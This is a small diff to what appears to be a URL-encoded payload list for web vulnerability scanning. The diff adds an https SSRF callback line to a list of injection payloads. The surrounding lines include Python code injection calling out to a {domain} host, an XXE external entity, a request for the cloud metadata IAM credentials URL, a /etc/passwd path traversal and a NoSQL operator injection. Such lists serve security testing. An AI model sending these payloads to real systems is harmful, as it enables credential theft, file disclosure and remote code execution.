@@ -18,6 +18,7 @@ __import__%28%27urllib.request%27%29.request.urlopen%28%27http%3A%2F%2F%7Bdomain
 %3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2F%7Bdomain%7D%2Fxxe%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E
 http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F
 http%3A%2F%2F%7Bdomain%7D%2Fssrf
+https%3A%2F%2F%7Bdomain%7D%2Fssrf
 ..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 return%207%2A191
 %7B%22%24gt%22%3A%22%22%2C%22%24ne%22%3A%22%22%7D
